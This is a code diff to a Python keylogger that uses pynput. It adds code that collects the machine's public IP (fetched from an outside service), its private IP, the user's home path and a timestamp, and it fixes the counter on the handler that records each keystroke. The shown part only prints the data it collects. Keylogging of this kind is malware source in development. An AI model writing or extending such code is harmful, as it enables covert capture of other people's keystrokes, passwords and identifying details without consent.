@@ -1,6 +1,21 @@
 import pynput
+import time
+import os
+import random
+import requests
+import socket
 
 from pynput.keyboard import Key, Listener
+
+publicIP = requests.get('https://api.ipify.org').text
+privateIP = socket.gethostbyname('localhost')
+user = os.path.expanduser('~').split('\\')[0]
+datetime = time.ctime(time.time())
+
+print(publicIP)
+print(privateIP)
+print(user)
+print(datetime)
 
 
 count = 0
@@ -10,6 +25,7 @@ def on_press(key):
     global keys, count
 
     keys.append(key)
+    count += 1
     print("{0} pressed".format(key))
 
     if count>= 10:
